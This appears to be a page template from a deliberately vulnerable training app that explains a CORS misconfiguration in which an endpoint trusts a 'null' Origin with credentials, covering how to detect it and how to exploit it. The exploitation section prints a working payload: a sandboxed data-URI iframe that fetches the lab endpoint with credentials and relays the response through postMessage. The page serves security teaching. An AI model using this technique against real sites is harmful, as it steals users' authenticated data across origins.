{% extends "core/example_page_base.html" %} {% set example_title = "CORS: Null Origin Whitelisted" %} {% set example_difficulty = "Medium" %} {% block title %}{{ example_title }} — A05{% endblock %} {% block explanation %}

/a05/api/partner-directory explicitly trusts requests whose Origin header is the literal string null, responding with Access-Control-Allow-Origin: null and Access-Control-Allow-Credentials: true. This is a common leftover from testing an endpoint via a sandboxed iframe or a local file during development — browsers send a literal null Origin in exactly those situations, and an attacker can deliberately trigger one on demand.

{% endblock %} {% block detect %}

Request the endpoint with an Origin: null header and check whether the response reflects it back — a properly configured allowlist should never treat null as a real, trusted origin.

{% endblock %} {% block exploitation %}

A sandboxed iframe using a data: URI causes the browser to send a literal null Origin header on any request that iframe makes: 

<iframe sandbox="allow-scripts" src="data:text/html,
  <script>
    fetch('http://127.0.0.1:5001/a05/api/partner-directory', {credentials: 'include'})
      .then(r => r.json())
      .then(j => parent.postMessage(JSON.stringify(j), '*'));
  </script>
"></iframe>

Visit the demo page to see this exact technique running live — the sandboxed, data-URI iframe's requests carry a null Origin, which this endpoint explicitly trusts, letting the fetch succeed cross-origin with credentials attached.
